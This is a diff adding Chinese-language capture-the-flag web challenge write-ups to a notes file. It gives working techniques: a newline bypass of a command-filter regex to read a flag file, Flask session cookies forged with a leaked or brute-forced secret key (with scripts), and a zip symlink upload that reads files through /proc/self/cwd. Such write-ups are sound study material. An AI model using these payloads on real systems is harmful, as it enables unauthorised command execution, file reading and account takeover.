@@ -216,3 +216,83 @@ echo md5($name);//37897b4e2daea073c403f3985955cd0f
 ```
 最终payload:file=phar://upload/37897b4e2daea073c403f3985955cd0f.jpg
 `phar会自动反系列化Metadata中的数据,不管后缀如何`
+
+### 11.[FBCTF2019]RCEService
+这是一个执行json的命令行如：{"cmd":"ls"}
+    
+    使用的是preg_match绕过:通过fuzz，过滤了这些字符串
+```php
+if (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
+    echo 'Hacking attempt detected<br/><br/>';
+}
+```
+由于没有循环过滤，所以preg_match只会过滤第一行，使用`url`编码的`\n`即可绕过，如`%0a`
+ `payload:{ %0a "cmd":"/bin/cat ../../../../../home/rceservice/flag" %0a }`
+这个服务上的cat变量没有设置。需要自行指定
+### 12.[SWPU2019]Web3
+这个是一个flask的服务器
+通过访问一个404的页面获得key=keyqqqwwweee!@#$%^&*
+正常登陆，得到token=eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.XekLoQ.SbTTt8ISvhNT8GMDjRGK1F2sHF8
+通过解密得到数据{u'username': u'admin', u'password': u'1', u'id': '100', u'is_login': True}
+解密脚本
+```python
+import flask_session_cookie_manager2
+s = "eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.XekLoQ.SbTTt8ISvhNT8GMDjRGK1F2sHF8"
+key = "keyqqqwwweee!@#$%^&*"
+res = flask_session_cookie_manager2.FSCM.decode(s, key)
+print res
+```
+将100改为1，否则upload页面无法访问
+加密脚本
+```python
+res = "{u'username': u'admin', u'password': u'1', u'id': '1', u'is_login': True}"
+flag = flask_session_cookie_manager2.FSCM.encode(key, res)
+```
+访问upload页面后得到代码，这个是重点，存在漏洞
+```python
+cmd = "unzip -n -d "+path+" "+ pathname
+```
+构造一个软连接
+```shell
+ln -s /proc/self/cwd/flag/flag.jpg exp
+zip -ry exp.zip exp
+```
+这里的`/proc/self/cwd`是会指向进程的当前目录
+`这样服务解压完文件后将得到一个软连接，而这个软连接指向flag，读取这个exp就等于读取flag`
+将exp.zip上传即可得到flag
+### 13.[SWPU2019]Web4
+时间盲注，留坑
+### 14.[HarekazeCTF2019]Avatar Uploader 1
+给了源码，留坑
+### 15.[CISCN2019 华东南赛区]Web4
+通过url=app.py读取到源码，其中
+```python
+random.seed(uuid.getnode())
+app.config['SECRET_KEY'] = str(random.random()*233)
+@app.route('/flag') 
+def flag(): 
+ 	if session and session['username'] == 'fuck':
+ 	 	return open('/flag.txt').read() 
+ 	else: 
+ 		return 'Access denied'
+```
+`uuid.getnode()为mac地址去掉:的10进制数`可以通过`/sys/class/net/eth0/address`读取到mac地址
+由于伪随机数到问题，可以直接爆破得到`key`,再通过修改`username='fuck'`得到访问/flag得到flag
+脚本：
+```python
+import random
+import flask_session_cookie_manager2
+
+mac = "02:42:ae:00:3e:09"
+random.seed(int(mac.replace(":", ""), 16))
+for x in range(1000):
+    SECRET_KEY = str(random.random() * 233)
+    rs = flask_session_cookie_manager2.FSCM.decode('eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Xf9tCg.UY9vQq_TaU_r7ciAtdf1R3W2-k4', SECRET_KEY)
+    if 'error' not in rs:
+        print x
+        print(SECRET_KEY)
+        rs[u'username'] = 'fuck'
+        print(str(rs))
+        print(flask_session_cookie_manager2.FSCM.encode(SECRET_KEY, str(rs)))
+        break
+```
